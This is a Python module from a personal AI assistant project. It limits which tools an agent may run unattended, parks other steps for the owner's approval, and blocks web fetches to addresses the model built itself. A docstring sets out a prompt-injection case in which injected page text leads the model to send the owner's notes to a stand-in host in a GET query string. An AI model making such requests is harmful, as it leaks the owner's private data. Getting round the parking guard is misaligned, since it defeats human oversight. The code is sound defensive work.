"""Mark VI: what a mission may do UNATTENDED, and the per-thread guard that parks everything else for the owner's approval.

Default is PARK: only tools on the read-only allowlist run unattended (docs/plans/mark6-build-plan.md, code map section 2).
Hard-denied names always park, whatever the allowlist says. One approved step (by fingerprint) may run once.
Owner decisions 2026-11-10: an approval waits until he answers; a mission never takes the foreground.
"""
from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import Dict, Optional

# Read-only, no foreground, no money spent (code map section 2).
UNATTENDED_TOOLS = frozenset("""
security_checkup get_system_status pc_diagnose pc_find_files pc_find_duplicates pc_capabilities pc_school_status
list_windows observe_pc list_programs list_apps system_info get_time get_usage
find_character character_job_status where_is_rigged_character rigging_skills rigging_lessons
unreal_status shadow_world_check unreal_tests unreal_test_results unreal_log unreal_find_asset
homelab_status homelab_health list_folder app_logs jellyfin_overview jellyfin_search qbit_list
search_notes read_list recall recall_memories recall_today library_search library_list list_reminders list_timers list_countdowns
get_weather search_web_free read_web_pages mission_status
rig_my_character image_to_character
""".split())
# rig_my_character / image_to_character (C12): additive writes into JARVIS's own output folders only. Allowed since their
# jobs are quiet inside a mission (core/craftjobs.quiet_jobs): no Blender window opens and no second push is sent.

# Never unattended, even if listed above by mistake: they take the foreground, read the owner's screen/camera, spend money,
# run the game, or change things.
HARD_DENY = frozenset("""
read_screen look_at_screen see_pc_screen read_clipboard look_through_camera what_am_i_holding control_pc pc_command
shadow_world_game_test power pc_learned_skill browse_research browse_open pc_cleanup pc_purge pc_undo pc_uninstall
install_program uninstall_program open_app close_app focus_app use_app type_text open_path open_website
""".split())


def fingerprint(name: str, args: Dict) -> str:
    return json.dumps([name, args or {}], sort_keys=True, separators=(",", ":"))


def unattended(name: str, args: Optional[Dict] = None) -> bool:
    """May this registry tool run unattended with these arguments?"""
    if name in HARD_DENY or name not in UNATTENDED_TOOLS:
        return False
    if name == "where_is_rigged_character" and (args or {}).get("open_folder"):
        return False                                    # it would open Explorer in front
    return True


PARKED_TEXT = ("PARKED: this step needs the owner's OK and was sent to his phone. Do not try another way to do it; "
               "finish with what you have.")


_URL = re.compile(r"https?://[^\s\"'<>`\\\]\[(){}|]+", re.I)
# Tools that fetch a web address the model passes in (a GET can carry the owner's data out in its query string).
FETCH_TOOLS = {"read_web_pages": "urls"}
FETCH_STEPS = {"read_web_page": "url"}


def urls_in(text: str) -> set:
    return {u.rstrip(".,;:!?") for u in _URL.findall(text or "")}


def _addresses(args: Dict, key: str) -> list:
    v = (args or {}).get(key)
    if isinstance(v, str):
        return [v]
    return [u for u in v if isinstance(u, str)] if isinstance(v, (list, tuple)) else []


@dataclass
class MissionContext:
    """What one mission run allows: at most the one step the owner approved (by fingerprint), and it records the first
    step that needed him (parked).

    2026-11-10 review: a web fetch runs unattended only for an address that came OUT of a tool result (a search hit) or his
    own goal, never one the model built: injected page text could otherwise make the small model read his notes and send
    them out in a GET's query string (recall_memories -> read_web_pages https://x.example/?d=<notes>)."""
    approved: Optional[str] = None
    approved_used: bool = False
    parked: Optional[Dict] = None
    ran: list = field(default_factory=list)
    seen_urls: set = field(default_factory=set)

    def see_urls(self, text: str) -> None:
        self.seen_urls |= urls_in(text)

    def known_addresses(self, addresses: list) -> bool:
        return bool(addresses) and all(a.strip().rstrip(".,;:!?") in self.seen_urls for a in addresses)

    def guard(self, name: str, args: Dict) -> Optional[str]:
        fp = fingerprint(name, args)
        if self.approved and fp == self.approved and not self.approved_used:
            self.approved_used = True                   # his OK covers that exact step, once
            self.ran.append(name)
            return None
        fetch = FETCH_TOOLS.get(name)
        if unattended(name, args) and (fetch is None or self.known_addresses(_addresses(args, fetch))):
            self.ran.append(name)
            return None
        if self.parked is None:
            self.parked = {"tool": name, "arguments": dict(args or {})}
        return PARKED_TEXT


_SAFE_VERB = re.compile(r"^(?:get_volume|pc_status|list_windows|process_status|blender_status|list_scene_objects|inspect_blender|"
                        r"uia_read|unreal_status|shadow_world_check|unreal_tests|unreal_test_results|unreal_log|unreal_find_asset|"
                        r"find_project|find_files|investigate_slowness|read_web_page)$")


def unattended_step(step: Dict) -> bool:
    """A typed PC step (core/pcactions) that only observes and never takes the foreground. run_terminal only at tier 0."""
    tool = (step or {}).get("tool", "")
    try:
        from core import authz
        if authz.effect(step) != authz.OBSERVE:
            return False
    except Exception:  # noqa: BLE001 - unknown effect: park
        return False
    if tool == "run_terminal":
        try:
            from core import pcverbs
            return pcverbs.terminal_tier((step.get("arguments") or {}).get("command", "")) == 0
        except Exception:  # noqa: BLE001
            return False
    return bool(_SAFE_VERB.match(tool))
